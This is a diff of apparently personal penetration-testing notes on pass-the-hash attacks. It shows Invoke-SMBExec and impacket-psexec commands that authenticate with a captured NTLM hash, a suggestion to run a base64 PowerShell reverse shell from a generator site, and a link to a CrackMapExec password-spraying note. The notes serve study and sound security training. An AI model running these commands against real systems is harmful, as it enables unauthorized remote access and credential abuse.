@@ -337,4 +337,10 @@ PS C:\> Invoke-SMBExec -Target <Target_IP/Hostname> -Domain <Domain> -Username <
 > We could use a range of commands to add admin users or whatever. A useful thing could be to execute a reverse shell. A website like https://www.revshells.com/ can generate a PowerShell Base64 reverse shell command.
 
 #### PtH with Impacket (Linux)
-We can use a tool like Impacket's P
+We can use a tool like Impacket's `PsExec` to execute a PtH attack.
+```sh
+$ impacket-psexec <admin_user>@<target> -hashes :<hash>
+```
+
+#### Pass the Hash with CrackMapExec
+![[CrackMapExec#Password Spraying a domain using Pass-the-Hash]]
